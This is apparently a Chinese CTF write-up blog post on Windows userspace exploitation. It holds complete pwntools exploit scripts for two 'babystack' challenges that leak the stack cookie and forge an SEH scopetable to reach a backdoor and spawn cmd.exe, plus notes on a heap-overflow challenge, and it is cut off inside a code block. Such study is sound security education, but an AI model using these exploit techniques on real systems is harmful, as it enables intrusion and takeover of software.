<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  
    
      
    

    
  

  

  

  
    
      
    

    
  

  
    
    
    <link href="//fonts.googleapis.com/css?family=STZhongsong:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|consolas:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/014.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/014.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/014.jpg?v=5.1.4">






  <meta name="keywords" content="WP,Windows_Userspace_Pwn学习,">










<meta name="description" content="hitbgsec_babystack思路：程序开了SAFESEH，ebp之前有一堆检测。。。结构如下： 12345678|    ebp ^ cookie    | &amp;lt;- ebp-0x1c ---&amp;gt; 不能改，有栈溢出检测| ------------------ | &amp;lt;- ebp-0x18 ---&amp;gt; 随意| ------------------ | &amp;lt;- ebp-0x1">
<meta name="keywords" content="WP,Windows_Userspace_Pwn学习">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows_Userspace_Pwn学习">
<meta property="og:url" content="http://yoursite.com/2020/05/05/Windows_Userspace_Pwn学习/index.html">
<meta property="og:site_name" content="xiaoxiaorenwu">
<meta property="og:description" content="hitbgsec_babystack思路：程序开了SAFESEH，ebp之前有一堆检测。。。结构如下： 12345678|    ebp ^ cookie    | &amp;lt;- ebp-0x1c ---&amp;gt; 不能改，有栈溢出检测| ------------------ | &amp;lt;- ebp-0x18 ---&amp;gt; 随意| ------------------ | &amp;lt;- ebp-0x1">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://i.loli.net/2020/04/04/i4rPdukgyv6fHlc.png">
<meta property="og:image" content="c:/Users/HP/AppData/Roaming/Typora/typora-user-images/image-20201104203048032.png">
<meta property="og:image" content="c:/Users/HP/AppData/Roaming/Typora/typora-user-images/image-20201104203001361.png">
<meta property="og:image" content="c:/Users/HP/AppData/Roaming/Typora/typora-user-images/image-20201104203708196.png">
<meta property="og:image" content="c:/Users/HP/AppData/Roaming/Typora/typora-user-images/image-20201104204150241.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20191023223712174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NDI2MDEy,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="c:/Users/HP/AppData/Roaming/Typora/typora-user-images/image-20201106161234548.png">
<meta property="og:image" content="c:/Users/HP/AppData/Roaming/Typora/typora-user-images/image-20201104165855975.png">
<meta property="og:updated_time" content="2021-01-09T15:53:34.492Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Windows_Userspace_Pwn学习">
<meta name="twitter:description" content="hitbgsec_babystack思路：程序开了SAFESEH，ebp之前有一堆检测。。。结构如下： 12345678|    ebp ^ cookie    | &amp;lt;- ebp-0x1c ---&amp;gt; 不能改，有栈溢出检测| ------------------ | &amp;lt;- ebp-0x18 ---&amp;gt; 随意| ------------------ | &amp;lt;- ebp-0x1">
<meta name="twitter:image" content="https://i.loli.net/2020/04/04/i4rPdukgyv6fHlc.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","width":350,"display":"hide","offset":20,"b2t":true,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2020/05/05/Windows_Userspace_Pwn学习/">





  <title>Windows_Userspace_Pwn学习 | xiaoxiaorenwu</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta custom-logo">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">xiaoxiaorenwu</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">生活的艰辛，三分来自压力，七分来自攀比，我想做个小人物</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/05/Windows_Userspace_Pwn学习/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/xxrw.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xiaoxiaorenwu">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Windows_Userspace_Pwn学习</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-05T00:05:04+08:00">
                2020-05-05
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Windows-Userspace-Pwn学习/" itemprop="url" rel="index">
                    <span itemprop="name">Windows_Userspace_Pwn学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2020/05/05/Windows_Userspace_Pwn学习/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2020/05/05/Windows_Userspace_Pwn学习/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  14.4k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  78 min
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="hitbgsec-babystack"><a href="#hitbgsec-babystack" class="headerlink" title="hitbgsec_babystack"></a>hitbgsec_babystack</h1><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>程序开了<code>SAFESEH</code>，<code>ebp</code>之前有一堆检测。。。结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">|    ebp ^ cookie    | &lt;- ebp-0x1c ---&gt; 不能改，有栈溢出检测</span><br><span class="line">| ------------------ | &lt;- ebp-0x18 ---&gt; 随意</span><br><span class="line">| ------------------ | &lt;- ebp-0x14 ---&gt; 随意</span><br><span class="line">|     Next_pointer   | &lt;- ebp-0x10 ---&gt; SEH链结点，不能改</span><br><span class="line">|  __except_handler4 | &lt;- ebp-0xc  ---&gt; SEH链结点，不能改</span><br><span class="line">|scope_table ^ cookie| &lt;- ebp-0x8  ---&gt; 需泄露出cookie，然后伪造</span><br><span class="line">|      trylevel      | &lt;- ebp-0x4  ---&gt; 不用改，一般默认为0，不为-2即可</span><br><span class="line">|                    | &lt;- ebp</span><br></pre></td></tr></table></figure>
<p>在栈上伪造一个<code>scopetable</code>即可：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">backdoor = <span class="number">0x138D</span> + bin_base</span><br><span class="line">scopetable = p32(<span class="number">0xFFFFFFE4</span>)   <span class="comment">#抄原本的scopetable</span></span><br><span class="line">scopetable+= p32(<span class="number">0</span>)            <span class="comment">#抄原本的scopetable</span></span><br><span class="line">scopetable+= p32(<span class="number">0xFFFFFF20</span>)   <span class="comment">#抄原本的scopetable</span></span><br><span class="line">scopetable+= p32(<span class="number">0</span>)            <span class="comment">#抄原本的scopetable</span></span><br><span class="line">scopetable+= p32(<span class="number">0xFFFFFFFE</span>)   <span class="comment">#抄原本的scopetable</span></span><br><span class="line">scopetable+= p32(backdoor)</span><br></pre></td></tr></table></figure>
<h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p = remote(<span class="string">'192.168.21.1'</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'stack address = '</span>)</span><br><span class="line">stack = int(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">'main address = '</span>)</span><br><span class="line">main = int(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">bin_base = main<span class="number">-0x10b0</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'bin_base = '</span>+hex(bin_base))</span><br><span class="line">log.success(<span class="string">'stack = '</span>+hex(stack))</span><br><span class="line"></span><br><span class="line">__except_handler4 = <span class="number">0x1460</span>+bin_base</span><br><span class="line">___security_cookie_addr = <span class="number">0x4004</span>+bin_base</span><br><span class="line">log.success(<span class="string">'__except_handler4 = '</span>+hex(__except_handler4))</span><br><span class="line">log.success(<span class="string">'___security_cookie_addr = '</span>+hex(___security_cookie_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Do you want to know more?\r\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'yes'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'know\r\n'</span>)</span><br><span class="line">p.sendline(str(___security_cookie_addr))</span><br><span class="line">p.recvuntil(<span class="string">' value is '</span>)</span><br><span class="line">cookie = int(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'cookie = '</span>+hex(cookie))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Do you want to know more?\r\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'yes'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'know\r\n'</span>)</span><br><span class="line">p.sendline(str(stack+<span class="number">0x90</span><span class="number">-4</span>))</span><br><span class="line">p.recvuntil(<span class="string">' value is '</span>)</span><br><span class="line">Next_addr = int(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'Next_addr = '</span>+hex(Next_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Do you want to know more?\r\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'xxrw'</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x138D</span>+bin_base</span><br><span class="line">scopetable = p32(<span class="number">0xFFFFFFE4</span>)</span><br><span class="line">scopetable+= p32(<span class="number">0</span>)</span><br><span class="line">scopetable+= p32(<span class="number">0xFFFFFF20</span>)</span><br><span class="line">scopetable+= p32(<span class="number">0</span>)</span><br><span class="line">scopetable+= p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">scopetable+= p32(backdoor)</span><br><span class="line">fake_scope_table = stack+<span class="number">4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x11'</span>*<span class="number">4</span>+scopetable.ljust(<span class="number">0x7C</span>,<span class="string">'\x11'</span>)</span><br><span class="line">payload+= p32((stack+<span class="number">0x9C</span>)^cookie)+p32(<span class="number">0</span>)</span><br><span class="line">payload+= p32(<span class="number">0</span>)+p32(Next_addr)</span><br><span class="line">payload+= p32(__except_handler4)+p32(fake_scope_table^cookie)</span><br><span class="line">payload+= p32(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Do you want to know more?\r\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'yes'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'know\r\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'chcp 65001'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'cmd.exe'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'cmd.exe'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="2019第五空间决赛-九果"><a href="#2019第五空间决赛-九果" class="headerlink" title="2019第五空间决赛_九果"></a>2019第五空间决赛_九果</h1><p>抄的上题。</p>
<h1 id="2019SUCTF-babystack"><a href="#2019SUCTF-babystack" class="headerlink" title="2019SUCTF_babystack"></a>2019SUCTF_babystack</h1><p>上面两题的稍微进化版。</p>
<h2 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h2><p>首先是个10进制转16进制的小算法，这个看不懂可以直接动态调，也能直接看出来，然后用除0异常触发藏在<code>stu_EAACE0</code>这个<code>main</code>函数的<code>scopetable</code>的<code>HandlerFunc</code>位置的后门函数，然后会来到一个和上面两题<code>main</code>函数很相似的函数。然后后续就和上面一样了，可能调偏移稍微麻烦一点。程序里有多处插了简单的桩，逆向时需稍稍注意。</p>
<h2 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">p = remote(<span class="string">'192.168.21.1'</span>,<span class="number">8889</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'stack address = '</span>)</span><br><span class="line">stack = int(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">'main address = 0x'</span>)</span><br><span class="line">main = p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>)</span><br><span class="line">bin_base = main[:<span class="number">-4</span>]</span><br><span class="line">target = bin_base+<span class="string">'8551'</span></span><br><span class="line">bin_base = int(bin_base+<span class="string">'0000'</span>,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'stack = '</span>+hex(stack))</span><br><span class="line">log.success(<span class="string">'bin_base = '</span>+hex(bin_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'So,Can You Tell me what did you know?\r\n'</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="string">'0'</span>*(<span class="number">8</span>-len(target)) + target</span><br><span class="line">p.sendline(target)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Do you want to know more?\r\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'yes'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Where do you want to know?\r\n'</span>)</span><br><span class="line">p.sendline(str(stack<span class="number">-0x30</span>))</span><br><span class="line">p.recvuntil(<span class="string">'value is '</span>)</span><br><span class="line">Next_pointer = int(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'Next_pointer = '</span>+hex(Next_pointer))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Do you want to know more?\r\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'yes'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Where do you want to know?\r\n'</span>)</span><br><span class="line">p.sendline(str(bin_base+<span class="number">0x7c004</span>))</span><br><span class="line">p.recvuntil(<span class="string">'value is '</span>)</span><br><span class="line">cookie = int(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'cookie = '</span>+hex(cookie))</span><br><span class="line"></span><br><span class="line">backdoor = bin_base+<span class="number">0x8266</span></span><br><span class="line">scopetable = p32(<span class="number">0xFFFFFFE4</span>)</span><br><span class="line">scopetable+= p32(<span class="number">0</span>)</span><br><span class="line">scopetable+= p32(<span class="number">0xFFFFFF0C</span>)</span><br><span class="line">scopetable+= p32(<span class="number">0</span>)</span><br><span class="line">scopetable+= p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">scopetable+= p32(backdoor)</span><br><span class="line"></span><br><span class="line">fake_scope_table = stack<span class="number">-0xc8</span></span><br><span class="line">payload = <span class="string">'\x11'</span>*<span class="number">4</span>+scopetable.ljust(<span class="number">0x90</span><span class="number">-4</span>,<span class="string">'\x11'</span>)</span><br><span class="line">payload+= p32((stack<span class="number">-0x20</span>)^cookie)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">payload+= p32(Next_pointer)+p32(bin_base+<span class="number">0x9a30</span>)</span><br><span class="line">payload+= p32(fake_scope_table^cookie)+p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Do you want to know more?\r\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'xxrw'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Do you want to know more?\r\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'yes'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Where do you want to know?\r\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="2019OGeek-babyheap"><a href="#2019OGeek-babyheap" class="headerlink" title="2019OGeek_babyheap"></a>2019OGeek_babyheap</h1><h2 id="思路：-2"><a href="#思路：-2" class="headerlink" title="思路："></a>思路：</h2><h3 id="Re："><a href="#Re：" class="headerlink" title="Re："></a>Re：</h3><p>当时做的时候，首先在逆向上卡住了，按不了<code>F5</code>，现在又重新逆了一遍。。。瞎弄了一波，调整了栈帧等，终于可以按<code>F5</code>了，不过<code>M4x</code>师傅也在<code>github</code>上放了这题的源码。</p>
<h3 id="Pwn："><a href="#Pwn：" class="headerlink" title="Pwn："></a>Pwn：</h3><p>当时做的时候，算是第一次碰到关于<code>heap</code>的<code>winpwn</code>，由于对<code>Rtlheap</code>一窍不通，所以觉得这题可能很难，实际上现在看来就是个经典的堆溢出，可能放到<code>linux</code>下可以直接秒杀的那种。</p>
<p>流程：<code>堆溢出</code> =&gt; <code>改next__HEAP_ENTRY(freed)的FLink和Blink</code> =&gt; <code>unlink</code> =&gt; <code>Arbitrary address rw</code> =&gt; <code>hijick stack</code> =&gt; <code>ROP</code></p>
<p><code>Ex</code>师傅的文章已经给了很细致的分析，我这里只记录几个自己的发现。</p>
<ul>
<li><code>babyheap</code>模块是导入了<code>ntdll.dll</code>模块的函数的，<code>HeapAlloc</code>和<code>InitializeSListHead</code>都是，所以就没有了泄露<code>KERNEL32</code>的必要了，具体为什么请自己调试。</li>
<li>最后爆破<code>main_ret_addr</code>的时候，我感觉每次<code>show</code>多一点貌似会快一点？可能是我个人感觉问题233。</li>
<li>查看<code>teb</code>之前需要切换到主线程，命令请看本文最后的<code>windbg</code>使用笔记。</li>
<li>关于编码问题，<code>linux</code>的中文编码方式是<code>unicode</code>，<code>win</code>是<code>gbk</code>，所以拿到<code>shell</code>需要转码。(如果你<code>win</code>是英文当我没说)</li>
</ul>
<h2 id="exp：-2"><a href="#exp：-2" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span 